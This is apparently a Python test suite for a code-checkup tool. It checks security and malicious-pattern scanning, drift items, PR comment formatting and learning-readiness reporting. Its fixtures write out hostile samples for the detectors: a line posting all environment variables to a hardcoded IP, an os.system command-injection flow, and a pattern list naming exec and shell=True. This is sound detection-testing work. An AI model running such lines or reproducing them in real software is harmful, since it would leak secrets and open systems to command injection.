#!/usr/bin/env python3
"""Tests for /checkup.

    python -m skills.checkup.test_checkup
"""

from __future__ import annotations

import json
import os
import sys
import tempfile
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[2]))

from skills.checkup.cli import (
    run, format_pr_comment, PR_COMMENT_MARKER, doctor, _nn_summary,
)


def _ok(msg, cond, state):
    print(f"  [{'PASS' if cond else 'FAIL'}] {msg}")
    state[0 if cond else 1] += 1


def main() -> int:
    state = [0, 0]
    print("== checkup tests ==")

    with tempfile.TemporaryDirectory() as d:
        proj = Path(d)
        (proj / "app.py").write_text("def f():\n    return 1\n", encoding="utf-8")
        r = run(proj)
        _ok("returns the canonical sections",
            all(k in r for k in ("directives", "infra_tips", "duplication",
                                 "cost", "by_component", "drift", "headline",
                                 "security", "malicious", "nn")), state)
        _ok("clean project has no security findings",
            r["security"]["count"] == 0 and r["security"]["available"], state)
        _ok("clean project has a malicious-scan section, nothing suspicious",
            r["malicious"]["available"] and r["malicious"]["suspicious"] == 0, state)
        _ok("nn audit is skipped when the project ships no botte_nn",
            r["nn"]["available"] is False, state)

        (proj / "help_text.py").write_text(
            "print('Install with: pip install numpy')\n"
            "needles = ('exec(', 'shell=True')\n",
            encoding="utf-8",
        )
        rh = run(proj)
        _ok("help and pattern-catalog text is not treated as malicious",
            rh["malicious"]["suspicious"] == 0, state)
        (proj / "runtime_install.py").write_text(
            "import subprocess\nsubprocess.run(['pip', 'install', 'unknown'])\n",
            encoding="utf-8",
        )
        ri = run(proj)
        _ok("runtime pip install remains a high-signal finding",
            ri["malicious"]["suspicious"] >= 1, state)
        (proj / "runtime_install.py").unlink()

        # a project with a real taint flow surfaces in security + drift + comment
        (proj / "vuln.py").write_text(
            "import os, sys\nos.system('echo ' + sys.argv[1])\n", encoding="utf-8")
        rv = run(proj)
        _ok("taint flow surfaces in checkup security",
            rv["security"]["count"] >= 1 and "CWE-78" in rv["security"]["by_cwe"], state)
        _ok("high-severity security adds a drift item",
            any("security finding" in x for x in rv["drift"]), state)
        _ok("security appears in the PR comment",
            "🛡️ Security" in format_pr_comment(rv), state)

        # exfiltration (POST env to a hardcoded IP — high-signal) → suspicious + drift
        (proj / "evil.py").write_text(
            "import os, requests\n"
            "requests.post('http://13.37.13.37/x', data=dict(os.environ))\n",
            encoding="utf-8")
        rm = run(proj)
        _ok("malicious-pattern scan flags obfuscated exec as suspicious",
            rm["malicious"]["suspicious"] >= 1, state)
        _ok("suspicious patterns add a drift item",
            any("suspicious code pattern" in x for x in rm["drift"]), state)
        _ok("malicious section appears in the PR comment",
            "🦠 Malicious-pattern scan" in format_pr_comment(rm), state)
        _ok("analysis cost is 0 LLM tokens", r["cost"]["analysis_llm_tokens"] == 0, state)
        _ok("flags missing policy as drift",
            any("policy" in x.lower() for x in r["drift"]), state)
        _ok("flags MCP-not-wired as drift",
            any("MCP" in x for x in r["drift"]), state)
        _ok("local MCP status remains actionable",
            r["mcp_wiring"] == {"status": "missing", "applicable": True}, state)

        previous_context = os.environ.get("BOTTE_CHECKUP_CONTEXT")
        os.environ["BOTTE_CHECKUP_CONTEXT"] = "github-pr"
        try:
            r_ci = run(proj)
        finally:
            if previous_context is None:
                os.environ.pop("BOTTE_CHECKUP_CONTEXT", None)
            else:
                os.environ["BOTTE_CHECKUP_CONTEXT"] = previous_context
        _ok("ephemeral PR checkup marks MCP wiring not applicable",
            r_ci["mcp_wiring"]["status"] == "not_applicable"
            and not any("MCP not wired" in x for x in r_ci["drift"]), state)
        _ok("PR comment explains why MCP wiring is not applicable",
            "MCP wiring **n/a in ephemeral CI**" in format_pr_comment(r_ci), state)
        _ok("result is JSON-serialisable", isinstance(json.dumps(r), str), state)

        # after committing a policy, that particular drift item goes away
        from skills.preflight import policy
        policy.write_default(proj)
        r2 = run(proj)
        _ok("policy drift clears once committed",
            r2["policy_committed"] and not any("No .botte/policy" in x for x in r2["drift"]),
            state)

        # PR comment formatting (for the GitHub Action)
        md = format_pr_comment(r)  # r has drift (no policy / no MCP)
        _ok("PR comment carries the stable marker", PR_COMMENT_MARKER in md, state)
        _ok("PR comment shows a drift verdict when there is drift",
            "drift item" in md and "### Drift to fix" in md, state)
        _ok("PR comment lists each drift item",
            all(x in md for x in r["drift"]), state)

        md_clean = format_pr_comment({"drift": [], "headline": "All good",
                                      "loc_total": 10, "policy_committed": True,
                                      "cost": {"analysis_llm_tokens": 0,
                                               "always_on_tokens_per_session": 0}},
                                     repo="zedarvates/botte-secrete", sha="abc1234def")
        _ok("PR comment shows the no-drift verdict", "No drift" in md_clean, state)
        _ok("PR comment links the commit when repo+sha given",
            "abc1234" in md_clean and "/commit/abc1234def" in md_clean, state)

    with tempfile.TemporaryDirectory() as d:
        proj = Path(d)
        (proj / "app.py").write_text("def f():\n    return 1\n", encoding="utf-8")
        dr = doctor(proj)
        _ok("doctor() adds machine + top_actions + verdict on top of checkup",
            all(k in dr for k in ("machine", "top_actions", "verdict", "drift", "headline")), state)
        _ok("doctor() verdict is a non-empty string", isinstance(dr["verdict"], str) and dr["verdict"], state)
        _ok("doctor() top_actions is capped at 3", len(dr["top_actions"]) <= 3, state)
        _ok("doctor() result is JSON-serialisable", bool(json.dumps(dr)), state)

        # machine section never raises even if llm_backends can't reach anything
        m = dr["machine"]
        _ok("machine section reports availability + backend list shape",
            "available" in m and (not m["available"] or "uses_local_models" in m), state)

    # Active-learning readiness: observations are visible but only explicit
    # feedback counts toward training/activation gates.
    from skills.botte_nn import active_learning as al_mod
    old_data_dir = al_mod.DATA_DIR
    with tempfile.TemporaryDirectory() as d:
        al_mod.DATA_DIR = Path(d) / "active_learning"
        try:
            al_mod.record_observation("binary_router", [0.2, 1.0, 1.0], 0,
                                      "local_returned")
            al_mod.record_feedback("binary_router", [0.7, 1.0, 1.0], 0, 1)
            al_mod.record_feedback(
                "compressibility_predictor", [0.1] * 6, 2, 2,
                outcome="oracle:compression_roundtrip",
            )
            al_mod.record_feedback(
                "semantic_cache_hit_predictor", [0.1] * 7, 0, 1,
                outcome="oracle:response_cache_semantic_hit",
            )
            summary = _nn_summary(Path(__file__).resolve().parents[2])
            learning = summary["learning"]
            _ok("nn summary separates observations from verified verdicts",
                learning["observations"] == 1 and learning["verified"] == 1, state)
            _ok("binary_router stays blocked below the honest data gates",
                not learning["train_ready"] and not learning["activation_ready"], state)
            _ok("nn summary exposes verified labels for every grounded model",
                learning["models"]["compressibility_predictor"]["verified"] == 1
                and learning["models"]["semantic_cache_hit_predictor"]["verified"] == 1,
                state)
            comment = format_pr_comment({"drift": [], "nn": summary,
                                         "policy_committed": True, "cost": {}})
            _ok("PR comment exposes verified-ledger readiness",
                "1/2,000 verified" in comment and "activation blocked" in comment, state)
            _ok("PR comment exposes automatic-oracle grounding progress",
                "compressibility_predictor=1" in comment
                and "semantic_cache_hit_predictor=1" in comment, state)
        finally:
            al_mod.DATA_DIR = old_data_dir

    passed, failed = state
    print(f"\nRESULT: {passed} passed, {failed} failed")
    return 0 if failed == 0 else 1


if __name__ == "__main__":
    raise SystemExit(main())
